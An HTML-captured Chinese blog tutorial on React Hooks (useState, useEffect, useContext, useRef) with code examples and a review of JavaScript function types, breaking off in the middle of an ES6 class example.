content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【React-9/Lesson93(2025-12-30)】React Hooks 深度解析：从基础到实战🎯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T11:28:35.000Z" title="Thu Feb 12 2026 11:28:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">📚 一、Hooks 概述</h2>
<h3 data-id="heading-1">🌟 什么是 Hooks</h3>
<p>Hooks 是 React 16.8 引入的新特性，它是一种函数编程思想的体现。Hooks 以 <code>use</code> 开头，用于封装 Vue/React 组件的状态和生命周期，让开发者可以"呼之即来"，使用起来非常方便。</p>
<p>Hooks 的核心理念是将组件的状态逻辑抽离出来，使组件更加简洁、可维护。通过 Hooks，我们可以在不编写 class 组件的情况下使用 state 以及其他的 React 特性。</p>
<h3 data-id="heading-2">🔧 Hooks 的分类</h3>
<p>Hooks 可以分为两大类：</p>
<ol>
<li><strong>React 内置 Hooks</strong>：React 官方提供的一系列常用 Hooks</li>
<li><strong>自定义 Hooks</strong>：开发者根据业务需求自己封装的 Hooks</li>
</ol>
<h2 data-id="heading-3">🎨 二、React 内置 Hooks 详解</h2>
<h3 data-id="heading-4">1️⃣ useState Hook</h3>
<p><code>useState</code> 是最基础的 Hook，用于在函数组件中添加状态管理能力。</p>
<h4 data-id="heading-5">基本语法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialValue)
</code></pre>
<h4 data-id="heading-6">参数说明</h4>
<ul>
<li><code>initialValue</code>：状态的初始值，可以是任意类型（数字、字符串、对象、数组等）</li>
<li>也可以是一个函数，用于惰性初始化状态</li>
</ul>
<h4 data-id="heading-7">返回值</h4>
<p>返回一个数组，包含两个元素：</p>
<ul>
<li>第一个元素：当前状态的值</li>
<li>第二个元素：更新状态的函数</li>
</ul>
<h4 data-id="heading-8">使用示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前计数：{count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;增加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count - 1)}&gt;减少<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-9">惰性初始化</h4>
<p>当初始状态需要通过复杂计算得出时，可以使用函数作为初始值：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [todos, setTodos] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> storedTodos = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'todos'</span>)
  <span class="hljs-keyword">return</span> storedTodos ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(storedTodos) : []
})
</code></pre>
<p>这种方式可以避免每次渲染都执行复杂的初始化逻辑。</p>
<h4 data-id="heading-10">状态更新注意事项</h4>
<ol>
<li><strong>直接替换</strong>：状态更新是直接替换，而不是合并</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> })

<span class="hljs-comment">// 错误方式</span>
<span class="hljs-title function_">setUser</span>({ <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> }) <span class="hljs-comment">// 会丢失 name 属性</span>

<span class="hljs-comment">// 正确方式</span>
<span class="hljs-title function_">setUser</span>({ ...user, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> })
</code></pre>
<ol start="2">
<li>
<p><strong>异步更新</strong>：状态更新是异步的，不能立即获取到最新值</p>
</li>
<li>
<p><strong>函数式更新</strong>：当新状态依赖于旧状态时，使用函数式更新</p>
</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prevCount</span> =&gt;</span> prevCount + <span class="hljs-number">1</span>)
</code></pre>
<h3 data-id="heading-11">2️⃣ useEffect Hook</h3>
<p><code>useEffect</code> 用于处理副作用操作，如数据获取、订阅、手动修改 DOM 等。</p>
<h4 data-id="heading-12">基本语法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 副作用代码</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 清理函数（可选）</span>
  }
}, [dependencies])
</code></pre>
<h4 data-id="heading-13">参数说明</h4>
<ol>
<li><strong>第一个参数</strong>：副作用函数，在组件渲染后执行</li>
<li><strong>第二个参数</strong>：依赖数组，控制副作用何时执行</li>
</ol>
<h4 data-id="heading-14">执行时机</h4>





















<table><thead><tr><th>依赖数组</th><th>执行时机</th></tr></thead><tbody><tr><td>不提供</td><td>每次渲染后都执行</td></tr><tr><td><code>[]</code></td><td>只在组件挂载时执行一次</td></tr><tr><td><code>[a, b]</code></td><td>当 a 或 b 变化时执行</td></tr></tbody></table>
<h4 data-id="heading-15">清理函数</h4>
<p>清理函数在组件卸载或下一次副作用执行前执行，主要用于：</p>
<ul>
<li>清除事件监听器</li>
<li>清除定时器</li>
<li>取消网络请求</li>
<li>清除订阅</li>
</ul>
<h4 data-id="heading-16">使用示例：事件监听</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useMouse</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [x, setX] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> [y, setY] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">update</span> = (<span class="hljs-params">event</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'鼠标移动'</span>)
      <span class="hljs-title function_">setX</span>(event.<span class="hljs-property">pageX</span>)
      <span class="hljs-title function_">setY</span>(event.<span class="hljs-property">pageY</span>)
    }
    
    <span class="hljs-comment">// 组件挂载时，监听 mousemove 事件</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'事件监听已添加'</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 组件卸载时，移除 mousemove 事件</span>
      <span class="hljs-comment">// 防止内存泄漏</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'清除事件监听'</span>)
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, update)
    }
  }, []) <span class="hljs-comment">// 空依赖数组，只在挂载时执行一次</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      鼠标位置：{x} {y}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-17">使用示例：数据持久化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STORAGE_KEY</span> = <span class="hljs-string">'todos'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadFromStorage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> storedTodos = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">STORAGE_KEY</span>)
  <span class="hljs-keyword">return</span> storedTodos ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(storedTodos) : []
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">saveToStorage</span>(<span class="hljs-params">todos</span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">STORAGE_KEY</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(todos))
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useTodos</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [todos, setTodos] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">loadFromStorage</span>())

  <span class="hljs-comment">// 监听 todos 变化，保存到 localStorage</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">saveToStorage</span>(todos)
  }, [todos])

  <span class="hljs-keyword">return</span> { todos, setTodos }
}
</code></pre>
<h3 data-id="heading-18">3️⃣ useContext Hook</h3>
<p><code>useContext</code> 用于在组件树中跨层级传递数据，避免通过 props 一层层传递。</p>
<h4 data-id="heading-19">基本语法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">MyContext</span>)
</code></pre>
<h4 data-id="heading-20">使用步骤</h4>
<ol>
<li>创建 Context</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(defaultValue)
</code></pre>
<ol start="2">
<li>提供 Context</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">&lt;<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span> value={<span class="hljs-comment">/* 某个值 */</span>}&gt;
  &lt;子组件 /&gt;
&lt;/<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span>&gt;
</code></pre>
<ol start="3">
<li>消费 Context</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ChildComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">MyContext</span>)
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}
</code></pre>
<h4 data-id="heading-21">使用示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createContext, useContext, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 创建 Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>()

<span class="hljs-comment">// 父组件提供 Context</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'light'</span>)
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">setTheme</span> }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
  )
}

<span class="hljs-comment">// 子组件消费 Context</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { theme, setTheme } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>)
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{theme}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === 'light' ? 'dark' : 'light')}&gt;
        切换主题
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-22">4️⃣ useRef Hook</h3>
<p><code>useRef</code> 用于创建一个可变的 ref 对象，其 <code>.current</code> 属性可以被赋值和读取。</p>
<h4 data-id="heading-23">基本语法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> refContainer = <span class="hljs-title function_">useRef</span>(initialValue)
</code></pre>
<h4 data-id="heading-24">主要用途</h4>
<ol>
<li><strong>访问 DOM 元素</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">TextInput</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>)
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()
  }, [])
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> /&gt;</span></span>
}
</code></pre>
<ol start="2">
<li><strong>保存可变值（不触发重新渲染）</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Timer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> timerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>)
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">start</span> = (<span class="hljs-params"/>) =&gt; {
    timerRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'定时器运行中'</span>)
    }, <span class="hljs-number">1000</span>)
  }
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">stop</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-built_in">clearInterval</span>(timerRef.<span class="hljs-property">current</span>)
  }
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{start}</span>&gt;</span>开始<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{stop}</span>&gt;</span>停止<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<ol start="3">
<li><strong>保存上一次的值</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">usePrevious</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">const</span> ref = <span class="hljs-title function_">useRef</span>()
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    ref.<span class="hljs-property">current</span> = value
  }, [value])
  
  <span class="hljs-keyword">return</span> ref.<span class="hljs-property">current</span>
}
</code></pre>
<h2 data-id="heading-25">📝 三、JavaScript 函数回顾</h2>
<h3 data-id="heading-26">1️⃣ 普通函数</h3>
<p>使用 <code>function</code> 关键字声明的函数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，<span class="hljs-subst">${name}</span>！`</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">'张三'</span>)) <span class="hljs-comment">// 你好，张三！</span>
</code></pre>
<p>特点：</p>
<ul>
<li>有函数提升</li>
<li>可以作为构造函数使用</li>
<li><code>this</code> 指向调用时的对象</li>
</ul>
<h3 data-id="heading-27">2️⃣ 箭头函数</h3>
<p>ES6 引入的函数语法，更简洁。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params">name</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，<span class="hljs-subst">${name}</span>！`</span>
}

<span class="hljs-comment">// 简写形式</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">greet</span> = name =&gt; <span class="hljs-string">`你好，<span class="hljs-subst">${name}</span>！`</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">'李四'</span>)) <span class="hljs-comment">// 你好，李四！</span>
</code></pre>
<p>特点：</p>
<ul>
<li>没有 <code>this</code> 绑定，<code>this</code> 继承自外层作用域</li>
<li>没有 <code>arguments</code> 对象</li>
<li>不能作为构造函数使用</li>
<li>没有 <code>prototype</code> 属性</li>
<li>更简洁的语法</li>
</ul>
<h3 data-id="heading-28">3️⃣ 匿名函数</h3>
<p>没有函数名的函数，通常作为回调函数使用。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1秒后执行'</span>)
}, <span class="hljs-number">1000</span>)

<span class="hljs-comment">// 箭头函数形式的匿名函数</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1秒后执行'</span>)
}, <span class="hljs-number">1000</span>)
</code></pre>
<h3 data-id="heading-29">4️⃣ 立即执行函数</h3>
<p>定义后立即执行的函数。</p>
<pre><code class="hljs language-javascript" lang="javascript">(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'立即执行'</span>)
})()

<span class="hljs-comment">// 箭头函数形式</span>
(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'立即执行'</span>)
})()
</code></pre>
<p>用途：</p>
<ul>
<li>创建独立作用域，避免变量污染</li>
<li>模块化代码</li>
<li>初始化配置</li>
</ul>
<h3 data-id="heading-30">5️⃣ 递归函数</h3>
<p>函数调用自身。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">factorial</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
  <span class="hljs-keyword">return</span> n * <span class="hljs-title function_">factorial</span>(n - <span class="hljs-number">1</span>)
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">factorial</span>(<span class="hljs-number">5</span>)) <span class="hljs-comment">// 120</span>
</code></pre>
<p>使用场景：</p>
<ul>
<li>遍历树形结构</li>
<li>计算阶乘、斐波那契数列</li>
<li>深度优先搜索</li>
</ul>
<h3 data-id="heading-31">6️⃣ 回调函数</h3>
<p>作为参数传递给另一个函数的函数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params">data, callback</span>) {
  <span class="hljs-comment">// 处理数据</span>
  <span class="hljs-keyword">const</span> result = data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item * <span class="hljs-number">2</span>)
  <span class="hljs-comment">// 调用回调函数</span>
  <span class="hljs-title function_">callback</span>(result)
}

<span class="hljs-title function_">processData</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result) <span class="hljs-comment">// [2, 4, 6]</span>
})
</code></pre>
<p>在 React 中广泛应用：</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;button onClick={<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleClick</span>(id)}&gt;
  点击我
&lt;/button&gt;
</code></pre>
<h3 data-id="heading-32">7️⃣ 构造函数</h3>
<p>用于创建对象的函数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，今年<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>)
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'王五'</span>, <span class="hljs-number">25</span>)
person.<span class="hljs-title function_">greet</span>() <span class="hljs-comment">// 我是王五，今年25岁</span>
</code></pre>
<p>ES6 类语法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age
  }
  
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
